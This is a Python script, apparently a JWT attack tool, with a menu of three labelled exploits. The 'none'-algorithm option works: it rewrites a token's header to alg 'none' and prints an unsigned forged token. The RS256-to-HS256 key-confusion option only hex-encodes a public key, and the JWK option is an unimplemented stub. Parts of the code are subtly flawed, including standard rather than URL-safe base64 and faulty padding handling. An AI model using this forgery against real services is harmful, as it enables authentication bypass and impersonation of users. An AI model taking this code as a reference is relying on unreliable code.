import base64
import json
import sys

jwt_sample = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU5MjYwMTMxOSwiZXhwIjoxNTkyNjAxNDM5LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.TFMvzHZ4s4Qa-YVlIIV0Pjw0eK4N0BFczzS6uoTWS_0"

def decode_b64(data):
    missing_padding = 4 - len(data) % 4
    if missing_padding:
        data += '=' * missing_padding
    return base64.b64decode(data)

def none_alg(jwt):
    jwt = jwt.encode(encoding='UTF-8')
    parsed_token = jwt.decode().split('.')
    
    """Decode header and payload, check for padding errors"""
    parsed_token[0] = decode_b64(parsed_token[0])
    parsed_token[1] = decode_b64(parsed_token[1])
    
    parsed_json_header = json.loads(parsed_token[0])
    parsed_json_payload = json.loads(parsed_token[1])
    
    """Change to none algorithm"""
    parsed_json_header["alg"] = "none"

    final_jwt_header = json.dumps(parsed_json_header)
    final_jwt_header = str(final_jwt_header).rstrip("=").encode("ascii","replace")
    final_header = final_jwt_header.decode('utf-8')
    final_header = final_header.encode('utf-8')

    final_jwt_payload = json.dumps(parsed_json_payload)
    final_jwt_payload = str(final_jwt_payload).rstrip("=").encode("ascii","replace")
    final_payload = final_jwt_payload.decode('utf-8')
    final_payload = final_payload.encode('utf-8')

    encoded_payload = base64.b64encode(final_payload).decode('utf-8').rstrip("=")
    encoded_header = base64.b64encode(final_header).decode('utf-8').strip("=")
    
    print('Returned JWT: ', encoded_header + '.' + encoded_payload + '.')

def rs256_to_hs256(jwt, pub_key_file):
    hex_key = ""
    with open(pub_key_file, 'r') as f:
        while True:
            char = f.read(1)
            if not char:
                break
            hex_key += hex(ord(char))
        f.close()
    print('Hex key: ', hex_key)

def jwk_forge(jwt):
    print('Not implemented yet')

def main():
    print('-----Select JWT exploit option-----')
    print('(1) "none" exploit')
    print('(2) "RS256 -> HS256" exploit')
    print('(3) "JWK" exploit')

    choice = input('Option: ')
    jwt = input('Enter JWT: ')

    if choice == '1':
        none_alg(jwt)
    elif choice == '2':
        pub_key_file = input('Please enter your public key file (e.g. key.pem): ')
        if pub_key_file is None:
            print('Invalid public key')
            sys.exit()
        rs256_to_hs256(jwt, pub_key_file)
    elif choice == '3':
        jwk_forge(jwt)
    else:
        print('Please enter a valid option')

if __name__ == "__main__":
    main()
